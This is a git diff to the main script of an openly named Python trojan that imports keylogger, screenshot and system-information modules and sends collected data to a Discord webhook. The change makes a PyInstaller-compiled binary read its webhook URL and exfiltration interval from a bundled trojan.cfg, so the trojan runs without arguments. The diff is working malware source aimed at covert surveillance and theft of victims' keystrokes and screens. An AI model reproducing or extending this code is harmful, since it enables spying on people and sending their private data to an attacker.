@@ -3,9 +3,12 @@
 
 __author__ = "EONRaider @ keybase.io/eonraider"
 
+import configparser
 import os
 import platform
+import sys
 from concurrent.futures import ThreadPoolExecutor
+from pathlib import Path
 from uuid import uuid4
 
 from src.modules import Discord, KeyLogger, ScreenShot, SystemInformation
@@ -60,10 +63,35 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser()
     parser.add_argument("-w", "--webhook",
                         type=str,
-                        required=True)
+                        metavar="WEBHOOK URL")
     parser.add_argument("-e", "--exfil-time",
                         type=float,
-                        required=True)
+                        metavar="SECONDS",
+                        default=30)
     _args = parser.parse_args()
 
-    Trojan(exfil_time=_args.exfil_time, webhook=_args.webhook).execute()
+    try:
+        '''Trojan is executed as a binary compiled by PyInstaller. All 
+        configuration options are read from the 'trojan.cfg' file that 
+        is bundled in the binary during the build process defined in the 
+        'build.py' file. In this case the location of all added data 
+        will be a temporary directory set by sys._MEIPASS. If such 
+        directory does not exist then an AttributeError is raised.'''
+        tmp_dir = Path(sys._MEIPASS)
+        config = configparser.ConfigParser()
+        config_file = config.read(tmp_dir.joinpath("trojan.cfg"))
+        if len(config_file) == 0:
+            raise SystemExit(
+                "Cannot initialize the trojan without specification of a "
+                "Discord Webhook URL to connect to."
+            )
+        client_cfg = config["TROJAN"]
+        Trojan(
+            webhook=client_cfg.get("Webhook"),
+            exfil_time=client_cfg.getint("ExfiltrationTime")
+        ).execute()
+    except AttributeError:
+        '''Trojan is executed from source code by the system interpreter 
+        for development purposes. All configuration options are parsed 
+        from the CLI.'''
+        Trojan(webhook=_args.webhook, exfil_time=_args.exfil_time).execute()
